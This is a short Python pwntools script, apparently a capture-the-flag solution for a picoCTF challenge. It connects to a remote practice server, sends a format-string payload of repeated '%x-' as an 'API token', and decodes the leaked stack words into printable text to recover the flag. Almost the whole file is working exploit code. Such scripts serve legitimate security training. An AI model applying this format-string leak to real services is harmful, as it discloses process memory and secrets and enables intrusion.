from pwn import *

context.update(arch='i386', os='linux')
context.terminal= [ "tmux","splitw","-h"]

#p = process("./vuln")

p = remote("mercury.picoctf.net",16439)
#gdb.attach(p)

p.recvuntil("View my portfolio")

payload = "1"
p.sendline(payload)
p.recvuntil("API token?")

payload = "%x-" * 25
p.sendline(payload)

p.recvuntil("Buying stonks with token:\n")
data=p.recvline()
data = data.decode()

p.interactive()

s=""
#split and reverse
for i in data.split('-'):
    if len(i) == 8:
        a = bytearray.fromhex(i)

        for b in reversed(a):
            if b > 32 and b < 128:
                s += chr(b)

print(s)
